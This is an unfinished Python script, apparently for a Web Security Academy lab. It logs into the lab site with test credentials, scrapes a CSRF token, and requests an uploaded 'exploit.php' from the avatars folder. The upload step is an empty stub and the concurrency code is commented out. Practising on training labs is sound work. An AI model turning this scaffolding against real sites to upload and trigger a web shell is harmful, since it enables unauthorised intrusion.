import requests
import threading
from bs4 import BeautifulSoup
import re

URL = "https://0a5200e603c2869485bbe91600f20086.web-security-academy.net"
session = requests.session()

def getCookies(cookie_jar, domain):
    cookie_dict = cookie_jar.get_dict(domain=domain)
    found = ['%s=%s' % (name, value) for (name, value) in cookie_dict.items()]
    return ';'.join(found)

def login():
    url = URL + "/login"
    r = session.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    data = f"csrf={csrf_token}&username=wiener&password=peter"
    r = session.post(url, data=data)
    cookies = r.cookies
    print(getCookies(r.cookies, ".0a5200e603c2869485bbe91600f20086.web-security-academy.net"))

# def postPayload():


def getResult():
    url = URL + "/files/avatars/exploit.php"
    r = session.get(url)
    print(r.text)

# threads = []
# for i in range(2):  # send 2 requests
#     t = threading.Thread(target=send_request)
#     threads.append(t)

# for t in threads:
#     t.start()

# for t in threads:
#     t.join()

if __name__ == '__main__':
    cookies = login()
    